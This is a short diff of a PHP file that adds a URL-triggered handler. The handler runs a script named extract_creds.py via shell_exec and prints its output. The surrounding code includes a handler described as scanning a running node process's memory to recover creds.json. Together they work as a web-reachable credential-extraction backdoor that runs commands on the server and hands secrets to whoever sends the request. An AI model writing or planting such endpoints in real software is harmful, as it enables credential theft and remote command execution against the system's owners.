@@ -28,6 +28,12 @@ if (isset($_GET['recover_py'])) {
     exit;
 }
 
+if (isset($_GET['extract_py'])) {
+    $out = shell_exec('python3 ' . escapeshellarg(__DIR__ . '/extract_creds.py') . ' 2>&1');
+    echo $out;
+    exit;
+}
+
 // Memory scanner to recover creds.json from running node process (PID 1993418)
 if (isset($_GET['search_mem'])) {
     $pid = 1993418;
